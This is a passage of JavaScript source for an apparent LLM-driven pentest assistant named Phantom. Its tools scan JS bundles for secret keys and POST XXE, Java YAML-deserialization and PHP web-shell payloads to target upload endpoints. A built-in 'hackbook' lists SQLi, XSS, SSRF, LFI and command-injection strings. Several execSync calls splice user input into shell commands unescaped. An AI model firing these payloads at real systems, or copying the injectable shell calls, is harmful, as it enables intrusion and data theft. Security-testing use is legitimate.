      return `🔍 GitHub Dork — ${d.total_count} result(s)\n${d.items.slice(0,10).map(i => `  📄 ${i.repository?.full_name||"?"}/${i.name}`).join("\n")}`;
    } catch (e) { return `[GitHubDork Error] ${e.message}`; }
  },
  sub_takeover: async (input) => {
    try {
      const domain = input.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
      const r = await fetch(`https://dns.google/resolve?name=${domain}&type=CNAME`, {signal:AbortSignal.timeout(8000)});
      const d = await r.json();
      const cnames = d?.Answer?.filter(a => a.type === 5).map(a => a.data) || [];
      if (!cnames.length) return `[SubTakeover] No CNAME for ${domain}`;
      const svcs = {"cloudfront.net":"AWS CloudFront","s3.amazonaws.com":"AWS S3","github.io":"GitHub Pages","herokuapp.com":"Heroku","azurewebsites.net":"Azure","trafficmanager.net":"Azure TM","pantheonsite.io":"Pantheon","squarespace.com":"Squarespace","zendesk.com":"Zendesk","freshdesk.com":"Freshdesk","helpscout.net":"Help Scout","readme.io":"ReadMe","unbounce.com":"Unbounce","statuspage.io":"Statuspage"};
      const lines = cnames.map(c => { const s = Object.entries(svcs).find(([k]) => c.includes(k)); return s ? `  ⚠ → ${c.trim()} — ${s[1]} takeover!` : `  ℹ → ${c.trim()}`; });
      return `🔍 Subdomain Takeover — ${domain}\n${lines.join("\n")}`;
    } catch (e) { return `[SubTakeover Error] ${e.message}`; }
  },

  // ── JS BUNDLE ANALYZER ──
  js_analyze: async (input) => {
    try {
      const url = input.trim();
      if (!url) return "[js_analyze] Usage: js_analyze|https://target.com/app.js";
      const r = await fetch(url, { signal: AbortSignal.timeout(15000) });
      if (!r.ok) return `[js_analyze] HTTP ${r.status}`;
      const code = await r.text();
      if (code.length > 500000) return "[js_analyze] File too large (>500KB), use narrower scope";
      const findings = [];
      const keyPatterns = [
        [/AIza[0-9A-Za-z_-]{35}/g, "Google API key"],
        [/sk-[0-9a-zA-Z]{32,}/g, "OpenAI API key"],
        [/ghp_[0-9a-zA-Z]{36}/g, "GitHub token"],
        [/sk_live_[0-9a-zA-Z]{24,}/g, "Stripe live key"],
        [/AKIA[0-9A-Z]{16}/g, "AWS access key"],
        [/-----BEGIN (RSA |EC )?PRIVATE KEY-----/g, "Private key"],
        [/xox[baprs]-[0-9a-zA-Z-]{24,}/g, "Slack token"],
        [/mongodb(\+srv)?:\/\/[^\s\"'`<>]+/g, "MongoDB URL"],
      ];
      for (const [re, label] of keyPatterns) {
        const matches = code.match(re);
        if (matches) findings.push(`  \u26a0 ${label}: ${matches.slice(0,3).map(m => m.length>40?m.substring(0,37)+"...":m).join(", ")}`);
      }
      const apiEndpoints = [...new Set([...code.matchAll(/["'\`](\/[a-zA-Z0-9_\/.-]+\/api\/[a-zA-Z0-9_\/.-]+)["'\`]/g)].map(m=>m[1]))];
      if (apiEndpoints.length>0) findings.push(`  \u{1F4E1} Endpoints: ${apiEndpoints.slice(0,10).join(", ")}`);
      const xssSinks = [...new Set([...code.matchAll(/(innerHTML|outerHTML|document\.write|eval\(|dangerouslySetInnerHTML)/g)].map(m=>m[1]))];
      if (xssSinks.length>0) findings.push(`  \u{1F489} XSS sinks: ${xssSinks.slice(0,5).join(", ")}`);
      const comments = code.match(/\/\/\s*(TODO|FIXME|HACK|XXX|BUG|SECURITY|API_KEY|PASSWORD|TOKEN)\s*[:=]?/gi);
      if (comments) findings.push(`  \u{1F4DD} Comments (${[...new Set(comments)].length})`);
      if (!findings.length) return `[js_analyze] No secrets/endpoints in ${url.split("/").pop()} (${(code.length/1024).toFixed(1)}KB)`;
      return `\u{1F52C} JS Analysis: ${url.split("/").pop()} (${(code.length/1024).toFixed(1)}KB)\n${findings.join("\n")}`;
    } catch (e) { return `[js_analyze Error] ${e.message}`; }
  },

  // ── FILE UPLOAD TESTER — XXE, polyglot ──
  upload_test: async (input) => {
    try {
      const parts = input.split("|").map(s=>s.trim());
      const url = parts[0]||"";
      const mode = (parts[1]||"xxe").toLowerCase();
      if (!url) return "[upload_test] Usage: upload_test|https://target/upload|xxe\nModes: xxe, yaml, polyglot, all";
      const payloads = {
        xxe: `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><file>&xxe;</file></root>`,
        yaml: `---\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://COLLAB"]]]]\n`,
        polyglot: `GIF89a/*<?php system($_GET['cmd']); ?>*/`,
      };
      const results = [];
      const modes = mode==="all"?Object.keys(payloads):[mode];
      for (const m of modes) {
        if (!payloads[m]) continue;
        try {
          const r = await fetch(url, {method:"POST",signal:AbortSignal.timeout(10000),
            body:payloads[m],headers:{"Content-Type":"application/octet-stream"}});
          const t = await r.text();
          if (t.includes("root:")||t.includes("www-data")) results.push(`  \u26a0 ${m}: XXE confirmed — file read`);
          else if (r.status>=500&&t.includes("php")) results.push(`  \u26a0 ${m}: Possible code exec`);
          else results.push(`  \u2713 ${m}: ${r.status} — filtered`);
        } catch(e){results.push(`  \u2715 ${m}: ${e.message}`);}
      }
      return `\u{1F4E4} Upload Test: ${url}\n${results.join("\n")}`;
    } catch(e){return `[upload_test Error] ${e.message}`;}
  },

  // ── RATE LIMIT / TIMING / RACE TESTER ──
  rate_limit_test: async (input) => {
    try {
      const parts = input.split("|").map(s=>s.trim());
      const url = parts[0]||"";
      const mode = (parts[1]||"burst").toLowerCase();
      const count = parseInt(parts[2])||20;
      if(!url) return "[rate_limit_test] Usage: rate_limit_test|https://target/login|burst|30";
      const results = [];
      if(mode==="burst"||mode==="all"){
        let blocked=false; const start=Date.now();
        for(let i=0;i<Math.min(count,50);i++){
          const r=await fetch(url,{method:"GET",signal:AbortSignal.timeout(5000)});
          if(r.status===429||r.status===503){blocked=true;break;}
        }
        const e=Date.now()-start;
        if(blocked) results.push(`  \u2713 Rate limited — 429 after burst, ${e}ms`);
        else results.push(`  \u26a0 No rate limiting — ${(count/(e/1000)).toFixed(0)} req/s`);
      }
      if(mode==="timing"||mode==="all"){
        const times=[];
        for(const p of["valid=test&pw=wrong","valid=admin&pw=WRONG","valid=nonexist&pw=nonexist"]){
          const s=Date.now();
          try{await fetch(url,{method:"POST",signal:AbortSignal.timeout(5000),
            body:p,headers:{"Content-Type":"application/x-www-form-urlencoded"}});}catch{}
          times.push(Date.now()-s);
        }
        const diff=Math.abs(times[1]-times[2]);
        if(diff>100) results.push(`  \u26a0 Timing leak: ${diff}ms diff — possible enum`);
        else results.push(`  \u2713 Timing consistent (\u00b1${diff}ms)`);
      }
      if(mode==="race"||mode==="all"){
        const p=[];
        for(let i=0;i<Math.min(count,15);i++) p.push(fetch(url,{method:"GET",signal:AbortSignal.timeout(5000)}));
        const res=await Promise.all(p);
        const ok=res.filter(r=>r.status===200||r.status===201||r.status===302).length;
        if(ok>1) results.push(`  \u26a0 Race window: ${ok}/${res.length} concurrent successes`);
        else results.push(`  \u2713 No race window`);
      }
      return `\u23F1 Rate Limit Test: ${url} (${mode})\n${results.join("\n")}`;
    } catch(e){return `[rate_limit_test Error] ${e.message}`;}
  },

  plugin_load: async (input) => {
    try {
      const {existsSync,mkdirSync,readdirSync,resolve} = await import("fs/promises").catch(() => $r("fs"));
      const pf = await import("path");
      const pluginDir = (input||"").trim() || $r("os").homedir() + "/.config/phantom/plugins";
      if (!existsSync(pluginDir)) mkdirSync(pluginDir, {recursive: true});
      const files = readdirSync(pluginDir).filter(f => f.endsWith(".mjs") || f.endsWith(".js"));
      if (!files.length) return `[Plugin] No plugins in ${pluginDir}`;
      let loaded = 0;
      for (const f of files) {
        try { const mod = await import(pf.resolve(pluginDir, f)); if (mod.name && mod.execute) { globalThis.hackerTools ||= {}; globalThis.hackerTools[mod.name] = mod.execute; loaded++; } } catch {}
      }
      return loaded ? `🔌 Loaded ${loaded} plugin(s)` : `[Plugin] No valid plugins`;
    } catch (e) { return `[Plugin Error] ${e.message}`; }
  },
  plugin_create: async (input) => {
    try {
      const [name,...rest] = input.split("|"); const n = (name||"").trim().toLowerCase().replace(/[^a-z0-9_]/g,"_"); const desc = (rest[0]||"Custom plugin").trim();
      if (!n) return `[Plugin] Format: tool_name|description`;
      const d = $r("os").homedir() + "/.config/phantom/plugins"; $r("fs").mkdirSync(d, {recursive:true});
      const fp = d + "/" + n + ".mjs";
      $r("fs").writeFileSync(fp, `// Phantom Plugin: ${n}\n// ${desc}\nexport const name = "${n}";\nexport const description = "${desc}";\nexport async function execute(input) {\n  try { return \`[${n}] Processed: \${input}\`; } catch (e) { return \`[\${name} Error] \${e.message}\`; }\n}\n`);
      return `🔌 Plugin created: @${n}\n  ${fp}`;
    } catch (e) { return `[Plugin Error] ${e.message}`; }
  },
  report_export: async (input) => {
    try {
      const {existsSync,readdirSync,readFileSync,writeFileSync,mkdirSync} = $r("fs"); const {resolve} = $r("path"); const {homedir} = $r("os");
      const rd = resolve(homedir(), ".config", "phantom", "reports");
      const args = input.trim().split(/\s+/);
      const name = args[0] || "";
      const fmt = (args[1] || "html").toLowerCase();

      // If no args, list
      if (!name && existsSync(rd)) {
        const all = readdirSync(rd).filter(f => !f.includes("batch_")).filter(f => f.endsWith(".md"));
        if (!all.length) return `[ReportExport] No reports in ${rd}`;
        return `[ReportExport] Usage: @report_export|name [format]\\nFormats: html (default), json, txt\\nAvailable: ${all.join(", ")}`;
      }
      const fp = resolve(rd, name.includes(".") ? name : name + ".md");
      if (!existsSync(fp)) return `[ReportExport] Not found: ${name}`;
      const content = readFileSync(fp, "utf-8");

      if (fmt === "json") {
        const lines = content.split("\n").filter(Boolean);
        const json = JSON.stringify({ name, exported: new Date().toISOString(), lines, raw: content }, null, 2);
        const outPath = fp.replace(/\.\w+$/, ".json");
        writeFileSync(outPath, json, "utf-8");
        return `📄 JSON: ${outPath} (${json.length} bytes)`;
      }
      if (fmt === "txt") {
        const plain = content.replace(/^#+ /gm, "").replace(/\*\*(.+?)\*\*/g, "$1").replace(/`{3}[\s\S]*?`{3}/g, m => m.replace(/`{3}/g,"").trim());
        const outPath = fp.replace(/\.\w+$/, ".txt");
        writeFileSync(outPath, plain, "utf-8");
        return `📄 TXT: ${outPath} (${plain.length} bytes)`;
      }

      // Default: enhanced HTML export
      const title = name.replace(/\.md$/, "").replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
      const body = content
        .replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
        .replace(/^#### (.+)$/gm,"<h4>$1</h4>")
        .replace(/^### (.+)$/gm,"<h3>$1</h3>")
        .replace(/^## (.+)$/gm,"<h2>$1</h2>")
        .replace(/^# (.+)$/gm,"<h1>$1</h1>")
        .replace(/\*\*(.+?)\*\*/g,"<b>$1</b>")
        .replace(/`{3}([\s\S]*?)`{3}/g,"<pre>$1</pre>")
        .replace(/`(.+?)`/g,"<code>$1</code>")
        .replace(/\n/g,"<br>");
      const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Phantom — ${title}</title><style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:system-ui,-apple-system,sans-serif;max-width:900px;margin:0 auto;padding:24px;background:#0f0f1a;color:#c8d6e5;line-height:1.6}
        h1{color:#00ff88;border-bottom:2px solid #00ff88;padding-bottom:8px;margin:24px 0 16px}
        h2{color:#ffaa00;margin:20px 0 12px}
        h3{color:#5a7aff;margin:16px 0 8px}
        h4{color:#8899cc;margin:12px 0 6px}
        code,pre{background:#0a0a0f;color:#44ff88;padding:2px 8px;border-radius:4px;font-size:0.9em}
        pre{padding:16px;overflow-x:auto;border-left:3px solid #44ff88;margin:12px 0}
        b{color:#ff88aa}
        .header{text-align:center;padding:20px 0;border-bottom:1px solid #2a2a3e;margin-bottom:24px}
        .header h1{color:#00ff88;border:none;font-size:1.4em}
        .footer{text-align:center;padding:20px 0;margin-top:32px;border-top:1px solid #2a2a3e;color:#556;font-size:0.85em}
      </style></head><body>
      <div class="header"><h1>🔮 Phantom — ${title}</h1></div>
      ${body}
      <div class="footer">Generated by Phantom Cybersecurity Assistant • ${new Date().toLocaleString()}</div>
      </body></html>`;
      const outPath = fp.replace(/\.\w+$/, ".html");
      writeFileSync(outPath, html, "utf-8");
      return `📄 Export: ${outPath}\n   Formats: @report_export|${name}|json — @report_export|${name}|txt`;
    } catch (e) { return `[ReportExport Error] ${e.message}`; }
  },
  distro: async (input) => {
    try {
      const cmd = (input||"").trim().toLowerCase();
      const isProotEnv = __r.ENV.isProot;
      const distroId = ($r("fs").readFileSync("/etc/os-release","utf-8").match(/^ID=(.+)$/m) || [,"unknown"])[1];
      const prettyName = ($r("fs").readFileSync("/etc/os-release","utf-8").match(/^PRETTY_NAME="(.+)"$/m) || [,"Unknown"])[1];
      if (!cmd || cmd === "info") {
        return `📦 Current Distro\n  ID: ${distroId}\n  Name: ${prettyName}\n  Kernel: ${$r("os").release()}\n  Arch: ${process.arch}\n  ${isProotEnv ? "🔒 PRoot: yes (nested proot-distro not available)" : "🔓 PRoot: no (proot-distro available)"}\n  Host: Termux (Termux)\n\nCommands:\n  @distro|info       — show this\n  @distro|list       — list proot-distro environments (outside PRoot only)\n  @distro|run <name> <cmd> — run command in another distro (outside PRoot)`;
      }
      if (cmd === "list") {
        if (isProotEnv) return `[Distro] Can't list: already inside PRoot. Run from Termux host.`;
        const { execSync } = $r("child_process");
        const out = execSync("proot-distro list 2>&1", { encoding: "utf-8", timeout: 10000 });
        return `📦 Available Distros\n${out.trim()}`;
      }
      if (cmd.startsWith("run ")) {
        if (isProotEnv) return `[Distro] Can't run nested PRoot. Run from Termux host.`;
        const rest = cmd.slice(4).trim();
        const sp = rest.indexOf(" ");
        const dName = sp > 0 ? rest.slice(0, sp) : rest;
        const dCmd = sp > 0 ? rest.slice(sp + 1) : "whoami";
        const { execSync } = $r("child_process");
        const out = execSync(`proot-distro login ${dName} -- ${dCmd} 2>&1`, { encoding: "utf-8", timeout: 30000 });
        return `📦 [${dName}] $ ${dCmd}\n${out.trim()}`;
      }
      return `[Distro] Unknown: "${cmd}". Try: info, list, run <name> <cmd>`;
    } catch (e) { return `[Distro Error] ${e.message}`; }
  },
  llm_config: async (input) => {
    try {
      const provs = ["openai","anthropic","gemini","groq","deepseek","mistral","openrouter","ollama","opencode"];
      const envs = {openai:"OPENAI_API_KEY",anthropic:"ANTHROPIC_API_KEY",gemini:"GEMINI_API_KEY",groq:"GROQ_API_KEY",deepseek:"DEEPSEEK_API_KEY",mistral:"MISTRAL_API_KEY",openrouter:"OPENROUTER_API_KEY",ollama:"",opencode:"HERMES_OPCODE_API_KEY"};
      const cmd = (input||"").trim().toLowerCase();
      if (!cmd || cmd === "list" || cmd === "ls") {
        const cur = __r.PHANTOM_LLM_PROVIDER || "openai";
        const status = provs.map(p => {
          const e = envs[p]; const hasKey = !e || !!process.env[e];
          return `  ${p === cur ? "→" : " "} ${p.padEnd(12)} ${e ? (hasKey ? "✅ key set" : "❌ no key") : "🟢 local"}${e ? ` (${e})` : ""}`;
        }).join("\n");
        return `🤖 LLM Configuration\nProvider: ${cur}\n\nAvailable:\n${status}\n\nUsage:\n  @llm_config            — show this\n  @llm_config|<provider> — switch provider\n  @llm_config|set KEY value — set API key (persisted)\n  @llm_config|model name — set model override`;
      }
      if (cmd.startsWith("set ")) {
        const rest = cmd.slice(4).trim(); const sp = rest.indexOf(" ");
        const e = (sp > 0 ? rest.slice(0, sp) : rest).toUpperCase();
        const v = sp > 0 ? rest.slice(sp + 1) : "";
        if (!v) return `[LLM] Usage: @llm_config|set ENV_NAME value`;
        process.env[e] = v; __r._config[e] = v;
        try { fs.writeFileSync(resolve(BASE_DIR, "config.json"), JSON.stringify(__r._config, null, 2)); } catch {}
        return `✅ ${e} set and saved`;
      }
      if (cmd.startsWith("model ")) {
        const m = cmd.slice(6).trim(); if (!m) return `[LLM] Usage: @llm_config|model name`;
        __r._config.default_model = m;
        try { fs.writeFileSync(resolve(BASE_DIR, "config.json"), JSON.stringify(__r._config, null, 2)); } catch {}
        return `✅ Default model: ${m}`;
      }
      if (provs.includes(cmd)) {
        if (__r.llmInstance) { try { __r.llmInstance.provider = cmd; } catch {} }
        __r.setProvider(cmd);
        return `✅ Switched to ${cmd}. ${cmd === "ollama" ? "Run Ollama locally." : `Set ${cmd.toUpperCase()}_API_KEY if needed.`}`;
      }
      return `[LLM] Unknown: "${cmd}". Options: ${provs.join(", ")}, set KEY val, model name`;
    } catch (e) { return `[LLM Error] ${e.message}`; }
  },

  youtube_summarize: async (url) => {
    try {
      try { const { execSync } = await import("child_process"); execSync("command -v yt-dlp", { stdio: "pipe", timeout: 3000 }); } catch { return "[youtube] yt-dlp not found. Install: pip install yt-dlp"; }
      const { execSync } = await import("child_process");
      const title = execSync(`yt-dlp --print title "${url}" 2>/dev/null`, { encoding: "utf-8", timeout: 10000 }).trim();
      let transcript = "";
      try { transcript = execSync(`yt-dlp --write-auto-sub --sub-lang en --skip-download -o "%(id)s" "${url}" 2>/dev/null; cat *.vtt 2>/dev/null || true`, { encoding: "utf-8", timeout: 30000 }); } catch { try { transcript = execSync(`yt-dlp --write-subs --sub-lang en --skip-download -o "%(id)s" "${url}" 2>/dev/null; cat *.vtt 2>/dev/null || true`, { encoding: "utf-8", timeout: 30000 }); } catch {} }
      if (!transcript) try { transcript = execSync(`yt-dlp --print description "${url}" 2>/dev/null`, { encoding: "utf-8", timeout: 10000 }); } catch {}
      if (!transcript) return `[youtube] No transcript for: "${title}"`;
      transcript = transcript.replace(/\d{2}:\d{2}:\d{2}[.,]\d{3}\s*>\s*/g, "").replace(/WEBVTT[\s\S]*?X-TIMESTAMP-MAP.*?\n/g, "").trim();
      if (transcript.length > 6000) transcript = transcript.slice(0, 6000) + "\n...[truncated]";
      let summary = "";
      if (__r.llmInstance?.chat) {
        const resp = await __r.llmInstance.chat([
          { role: "system", content: "You are a cybersecurity training summarizer. Given a transcript, create: 1) 3-sentence summary 2) Key takeaways 3) A ready-to-use playbook with 3-5 steps. Format playbook as: ```playbook\nname: ...\ndescription: ...\nsteps:\n  - tool: ...\n    target: ...```" },
          { role: "user", content: `Video: "${title}"\nTranscript:\n${transcript}` }
        ]);
        summary = resp.trim();
      } else { summary = `Title: ${title}\nTranscript: ${transcript.length} chars\n(LLM unavailable) Data saved, add LLM for AI summary.`; }
      const name = `yt_${title.replace(/[^a-z0-9]/gi, "_").slice(0, 30).toLowerCase()}`;
      const pbPath = resolve(PLAYBOOKS_DIR, `${name}.json`);
      if (!fs.existsSync(PLAYBOOKS_DIR)) fs.mkdirSync(PLAYBOOKS_DIR, { recursive: true });
      fs.writeFileSync(pbPath, JSON.stringify({ name: title.slice(0,50), source: "youtube", url, created: new Date().toISOString(), summary }, null, 2), "utf-8");
      return `🎬 YouTube: "${title}"\nTranscript: ${transcript.length} chars\nPlaybook: ${pbPath}\n\n${summary.slice(0,2000)}`;
    } catch (e) { return `[youtube Error] ${e.message}`; }
  },

  hackbook: async (query) => {
    const q = query?.trim().toLowerCase() || "list";
    const HACKBOOK_PATH = resolve(BASE_DIR, "hackbook.json");
    // Load custom entries from file (merges with built-in)
    let customDb = [];
    try {
      if (fs.existsSync(HACKBOOK_PATH)) customDb = JSON.parse(fs.readFileSync(HACKBOOK_PATH, "utf-8"));
    } catch {}
    const builtinDb = [
      { id:"sql-injection", t:"SQL Injection (SQLi)", s:"Critical", d:"Attackers inject malicious SQL queries through input fields to manipulate databases, extract data, bypass auth, or execute commands.", i:"Data breach, auth bypass, RCE, complete DB compromise", test:["Submit single quote and double quote to trigger errors","Use time-based: ' OR SLEEP(5)--","UNION SELECT: ' UNION SELECT 1,2,3--","Test all vectors: GET, POST, headers, cookies","sqlmap -u 'http://target.com/page?id=1' --batch"], m:"Parameterized queries, input validation, least privilege DB accounts, WAF", tools:"sqlmap, jSQL, Burp Suite, NoSQLMap" },
      { id:"xss", t:"Cross-Site Scripting (XSS)", s:"High", d:"Attackers inject malicious scripts into web pages viewed by other users. Types: Reflected, Stored, DOM-based.", i:"Session hijacking, credential theft, defacement, phishing", test:["Inject <script>alert(1)</script>","Event handlers: <img src=x onerror=alert(1)>","Test URL params for reflected XSS","DOM-based via location.hash","Polyglot payloads for WAF bypass"], m:"Output encoding, Content-Security-Policy, HttpOnly cookies, X-XSS-Protection", tools:"XSStrike, Burp Suite, OWASP ZAP, BeEF, Dalfox" },
      { id:"csrf", t:"Cross-Site Request Forgery (CSRF)", s:"High", d:"Forces authenticated users to execute unwanted actions on a web app where they're authenticated.", i:"Unauthorized transactions, password changes, account takeover", test:["Check if state-changing requests lack CSRF tokens","Verify tokens tied to sessions","Test SameSite cookies","CORS misconfigurations","CSRF without origin/referer headers"], m:"Anti-CSRF tokens, SameSite=Strict/Lax cookies, Origin/Referer validation", tools:"Burp Suite, OWASP ZAP, CSRFTester" },
      { id:"ssrf", t:"Server-Side Request Forgery (SSRF)", s:"High", d:"Attackers make the server send requests to internal systems, bypassing firewalls.", i:"Internal network scanning, cloud metadata access, service exploitation", test:["Submit URLs to internal IPs: 127.0.0.1, 169.254.169.254","Cloud metadata: http://169.254.169.254/latest/meta-data/","URL scheme bypass: file://, dict://, gopher://","Redirect-based SSRF","DNS rebinding"], m:"Allowlist destinations, disable unnecessary URL schemes, network segmentation", tools:"SSRFmap, Gopherus, Interactsh" },
      { id:"rce", t:"Remote Code Execution (RCE)", s:"Critical", d:"Attackers execute arbitrary commands on the server via injection flaws.", i:"Full server compromise, data exfiltration, lateral movement, backdoor", test:["Command injection: ; whoami, | id, $(whoami)","File upload for web shells","Deserialization gadgets (Java, PHP, Python, .NET)","Template injection: {{7*7}}, ${7*7}","eval() sinks"], m:"Avoid dangerous functions (eval, exec, system), input validation, sandboxing, WAF", tools:"Metasploit, Commix, ysoserial, JexBoss" },
      { id:"lfi", t:"Local File Inclusion (LFI)", s:"High", d:"Attackers read arbitrary files by manipulating path parameters. Can lead to RCE.", i:"Source code disclosure, credential leakage, RCE via log poisoning", test:["Path traversal: ../../../etc/passwd","PHP wrappers: php://filter/convert.base64-encode/","Null byte injection","Log poisoning: inject PHP in UA, include access.log"], m:"Avoid dynamic includes, allowlist paths, disable allow_url_fopen", tools:"LFISuite, Kadimus, PHP filter chain" },
      { id:"idor", t:"Insecure Direct Object Reference (IDOR)", s:"Medium", d:"Attackers access unauthorized resources by modifying direct references.", i:"Unauthorized data access, account takeover, privilege escalation", test:["Increment IDs: /user/123 -> /user/124","Predictable UUIDs","Change params: ?invoice=123 -> ?invoice=456","Multi-tenant boundary violations"], m:"Access control checks, use unpredictable IDs (UUIDs)", tools:"Burp Sequencer, Autorize, AuthMatrix" },
      { id:"xxe", t:"XML External Entity (XXE)", s:"High", d:"Attackers exploit XML parsers to read files, perform SSRF, or cause DoS.", i:"File disclosure, SSRF, DoS (Billion Laughs), RCE", test:["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>","Blind XXE out-of-band","XXE in SVG upload, XML-RPC","XXE in docx/xlsx"], m:"Disable external entity processing, use JSON, disable DTDs", tools:"XXE-injection, OWASP ZAP, Burp Collaborator" },
      { id:"open-redirect", t:"Open Redirect", s:"Medium", d:"Application redirects users to attacker-controlled URLs via unvalidated params.", i:"Phishing, malware distribution, credential theft, SEO spam", test:["/redirect?url=http://evil.com","Protocol-relative: //evil.com","Domain confusion: https://evil.com@target.com","Redirect chains for SSRF"], m:"Allowlist valid destinations, validate URLs, require confirmation", tools:"Oralyzer, Burp Scanner, OWASP ZAP" },
      { id:"nosqli", t:"NoSQL Injection", s:"High", d:"Injection flaws in NoSQL databases where attackers inject JSON/JS operators.", i:"Auth bypass, data extraction, unauthorized access", test:["JSON operators: {$gt: ''}, {$ne: ''}, {$regex: '.*'}","username[$ne]=admin&password[$ne]=admin","POST with $where, $gte","NoSQL in login: ' || 1==1 //"], m:"Input validation, mongo-sanitize, parameterized queries", tools:"NoSQLMap, nosqli, Burp Suite" },
      { id:"file-upload", t:"Malicious File Upload", s:"High", d:"Attackers upload malicious files processed or served by the app.", i:"RCE via web shell, malware distribution, server compromise", test:["Double extension: shell.php.jpg","MIME type manipulation","Upload .htaccess: AddType x-httpd-php .txt","SVG with XXE"], m:"Validate extension and content, store outside webroot, rename files, limit size", tools:"Burp Upload Scanner, Fuxploider" },
      { id:"jwt", t:"JWT Attacks", s:"Medium", d:"Attacks on JSON Web Tokens: algorithm confusion, weak secrets, header injection.", i:"Auth bypass, privilege escalation, account takeover", test:["Algorithm to 'none': alg: none, empty sig","RS256 public key as HS256 secret","Bruteforce weak secret","kid header injection","Expired/revoked token testing"], m:"Enforce algorithm allowlist, strong secrets, validate claims, key rotation", tools:"jwt_tool, jwt-cracker, hashcat" },
      { id:"cors", t:"CORS Misconfiguration", s:"Medium", d:"Improper CORS headers allow cross-origin requests from unauthorized domains.", i:"Data exfiltration, API abuse, credential theft", test:["Origin: https://evil.com check ACAO reflection","ACA with wildcard origin","Null origin","Preflight bypass"], m:"Allowlist origins, never wildcards with credentials, Vary: Origin", tools:"CORS Scanner, Burp, corsy" },
      { id:"race-condition", t:"Race Condition", s:"Medium", d:"TOCTOU bugs where concurrent requests exploit gaps between check and use.", i:"Coupon abuse, ticket scalping, balance manipulation", test:["50 concurrent requests","Race password change","File upload race","Last-byte sync","Single-packet attack"], m:"Database transactions/locks, atomic operations, idempotency keys, rate limiting", tools:"Turbo Intruder (Burp), race-the-web" },
      { id:"bug-bounty-basics", t:"Bug Bounty Basics — Getting Started", s:"Info", d:"Bug bounties are when companies pay hackers to find vulnerabilities in their applications. Platforms like HackerOne, Bugcrowd, Synack, and Intigriti act as middlemen. You sign up, find bugs, report them, and if legit, you get paid ($50–$50,000). Before touching platforms, learn fundamentals through hands-on practice.", i:"Career in security, ethical hacking skills, potential income ($50–$50k per bug), real-world security impact", test:["Read 'Real-World Bug Hunting' by Peter Yaworski — study real bug bounty writeups","Practice on TryHackMe, HackTheBox, and PortSwigger Web Security Academy","Study OWASP Top 10: XSS, SSRF, SQLi, IDOR, CSRF, XXE, RCE, LFI, NoSQLi, race conditions","Learn Jason Haddix's recon methodology — passive recon → subdomain enum → directory bruteforce → parameter analysis","Intercept & analyze traffic with Burp Suite — don't just run scanners","Understand each tool's output — tools show the haystack, you find the needle"], m:"Read real bug reports before submitting. Understand scope rules on each platform. Never test out-of-scope targets. Write clear, reproducible reports. Be patient — days of nothing are normal.", tools:"Burp Suite, nuclei, subfinder, httpx, dir_brute, ffuf, OWASP ZAP, HackTheBox, TryHackMe, PortSwigger Academy", ref:"https://www.youtube.com/watch?v=1ve-YrLOE7E — Bug Bounty Hunting Basics for Beginners 2024" },
      { id:"cybersec-fundamentals", t:"Cybersecurity Fundamentals — 5 Core Skills", s:"Info", d:"Based on HackerSploit's guide. The 5 essential skills: (1) Virtual Machines — Hypervisors (VirtualBox/VMware/KVM), snapshots, isolated environments for training and malware analysis. (2) Command Line — Bash/Zsh/PowerShell, scripting, automation, WSL for Windows. (3) System Administration — configure/maintain systems, learn by doing, push limits. (4) Computer Networking — TCP/IP (4 layers) and OSI (7 layers), protocols, troubleshooting. (5) Personal Digital Security — passwords, encryption, secure comms, staying current.", i:"Foundation for ANY cybersecurity role (red/blue/IT ops), career readiness, practical hands-on skills over certs", test:["Install VirtualBox and set up a Kali Linux VM","Practice 10 basic Bash commands: ls, cd, grep, find, chmod, ps, netstat, curl, awk, sed","Configure a basic Linux server: SSH, firewall, users","Map TCP/IP layers for a web request: browser → DNS → TCP → HTTP","Set up a password manager and enable 2FA on all accounts"], m:"N/A — fundamentals guide", tools:"VirtualBox, VMware, WSL, Bash, Wireshark, nmap, OpenVPN" },
    ];
    if (q === "list") return `📚 PHANTOM HACKBOOK\n\nCategories (${builtinDb.length}):\n${builtinDb.map(e => `  ${e.t} — ${e.s}`).join("\n")}\n\nUsage: @hackbook|<category>\nExample: @hackbook|sql-injection`;
    const matches = builtinDb.filter(e => e.id.includes(q) || e.t.toLowerCase().includes(q) || e.d.toLowerCase().includes(q));
    if (!matches.length) return `[hackbook] No results for "${q}". Try: ${builtinDb.map(e=>e.id).join(", ")}`;
    if (matches.length > 1) return `[hackbook] Multiple: ${matches.map(e=>e.t).join(", ")}. Be specific.`;
    const e = matches[0];
    return `📚 ${e.t}\n${"=".repeat(40)}\nSeverity: ${e.s}\n\n📖 ${e.d}\n\n⚠️ Impact:\n${e.i}\n\n🔍 Testing:\n${e.test.map((s,i) => `  ${i+1}. ${s}`).join("\n")}\n\n🛡️ Mitigation:\n${e.m}\n\n🔧 Tools:\n${e.tools}\n${e.ref ? `\n📺 Reference:\n${e.ref}\n` : ""}${"=".repeat(40)}`;
  },

  code_analyze: async (input) => {
    const arg = input.trim();
    if (!arg) return "[code_analyze] Usage: @code_analyze|file_path or directory";
    try {
      const fp = resolve(process.cwd(), arg);
      const st = fs.statSync(fp);
      let files = [];
      if (st.isDirectory()) {
        const { readdirSync } = await import("fs");
        const all = readdirSync(fp, { recursive: true });
        const exts = [".js",".ts",".mjs",".py",".php",".java",".go",".rs",".cpp",".c",".h",".rb",".html",".sh",".yaml",".sql"];
        files = all.filter(f => exts.some(e => f.endsWith(e))).slice(0,20).map(f => resolve(fp, f));
        if (!files.length) files = [fp];
      } else { files = [fp]; }
      const results = [];
      for (const f of files.slice(0,5)) {
        const code = fs.readFileSync(f, "utf-8").slice(0,3000);
        const name = f.replace(process.cwd()+"/", "");
        const ext = f.split(".").pop();
        const issues = [];
        const checks = [
          { rx: [/\beval\s*\(/g, /\bexec\s*\(/g, /\bsystem\s*\(/g, /\bpopen\s*\(/g, /child_process/g], label: "eval/exec use" },
